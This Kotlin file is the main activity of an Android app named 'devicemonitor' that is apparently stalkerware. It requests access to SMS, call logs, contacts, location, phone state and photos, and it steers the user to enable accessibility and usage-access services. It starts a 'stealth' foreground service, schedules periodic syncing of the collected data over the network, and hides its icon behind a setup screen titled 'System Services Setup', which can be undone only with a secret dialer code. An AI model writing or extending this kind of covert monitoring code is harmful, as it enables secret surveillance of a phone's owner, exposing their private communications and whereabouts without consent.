package com.devicemonitor

import android.Manifest
import android.app.AlertDialog
import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Process
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.devicemonitor.service.SyncWorker
import com.devicemonitor.service.StealthModeService
import com.devicemonitor.ui.theme.DeviceMonitorTheme
import com.devicemonitor.utils.Constants
import java.util.concurrent.TimeUnit

class MainActivity : ComponentActivity() {

    private lateinit var sharedPrefs: SharedPreferences

    private val permissionsToRequest = mutableListOf<String>().apply {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.READ_PHONE_STATE)
        add(Manifest.permission.READ_EXTERNAL_STORAGE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
        }
    }

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        checkAllPermissionsGranted()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        sharedPrefs = getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)

        setContent {
            DeviceMonitorTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    SetupScreen(
                        modifier = Modifier.padding(innerPadding),
                        onStartSetup = {
                            checkAndRequestPermissions()
                        },
                        onOpenAccessibility = {
                            openAccessibilitySettings()
                        },
                        onOpenUsageStats = {
                            openUsageStatsSettings()
                        },
                        onEnterStealth = {
                            enterStealthMode()
                        }
                    )
                }
            }
        }

        // Start service immediately
        startStealthService()
    }

    private fun checkAndRequestPermissions() {
        val missingPermissions = permissionsToRequest.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            requestPermissionLauncher.launch(missingPermissions.toTypedArray())
        } else {
            checkAllPermissionsGranted()
        }
    }

    private fun checkAllPermissionsGranted() {
        val locationGranted = ContextCompat.checkSelfPermission(
            this, Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        val callLogGranted = ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED
        val smsGranted = ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
        val contactsGranted = ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_CONTACTS
        ) == PackageManager.PERMISSION_GRANTED

        if (locationGranted && callLogGranted && smsGranted && contactsGranted) {
            // Start background work if all permissions are granted
            scheduleSyncWork()
        }
    }

    private fun openAccessibilitySettings() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
    }

    private fun openUsageStatsSettings() {
        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
        startActivity(intent)
    }

    private fun enterStealthMode() {
        sharedPrefs.edit().putBoolean(Constants.PREF_STEALTH_MODE_ENABLED, true).apply()
        // Show confirmation dialog
        AlertDialog.Builder(this)
            .setTitle("Setup Complete")
            .setMessage("App is now in stealth mode! To unhide, dial *#*#12345#*#* or open secret://12345 in your browser/dialer.")
            .setPositiveButton("OK") { _, _ ->
                finish()
            }
            .show()
    }

    private fun startStealthService() {
        val serviceIntent = Intent(this, StealthModeService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun scheduleSyncWork() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(
            Constants.SYNC_INTERVAL_MINUTES, TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueue(syncRequest)
    }
}

@Composable
fun SetupScreen(
    modifier: Modifier = Modifier,
    onStartSetup: () -> Unit,
    onOpenAccessibility: () -> Unit,
    onOpenUsageStats: () -> Unit,
    onEnterStealth: () -> Unit
) {
    val context = LocalContext.current

    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(24.dp),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(
            text = "System Services Setup",
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(bottom = 32.dp)
        )

        // Step 1: Request basic permissions
        Button(
            onClick = onStartSetup,
            modifier = Modifier.fillMaxWidth()
        ) {
            Text(text = "1. Grant System Permissions")
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Step 2: Accessibility
        OutlinedButton(
            onClick = onOpenAccessibility,
            modifier = Modifier.fillMaxWidth()
        ) {
            Text(text = "2. Enable Accessibility Service")
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Step 3: Usage Stats
        OutlinedButton(
            onClick = onOpenUsageStats,
            modifier = Modifier.fillMaxWidth()
        ) {
            Text(text = "3. Enable Usage Access")
        }

        Spacer(modifier = Modifier.height(32.dp))

        // Enter Stealth
        Button(
            onClick = onEnterStealth,
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(
                containerColor = MaterialTheme.colorScheme.primary
            )
        ) {
            Text(text = "Enter Stealth Mode")
        }

        Spacer(modifier = Modifier.height(16.dp))

        Text(
            text = "Note: After entering stealth mode, the app icon will be hidden. To unhide, dial *#*#12345#*#*",
            style = MaterialTheme.typography.bodySmall,
            color = MaterialTheme.colorScheme.onSurfaceVariant,
            modifier = Modifier.padding(8.dp)
        )
    }
}
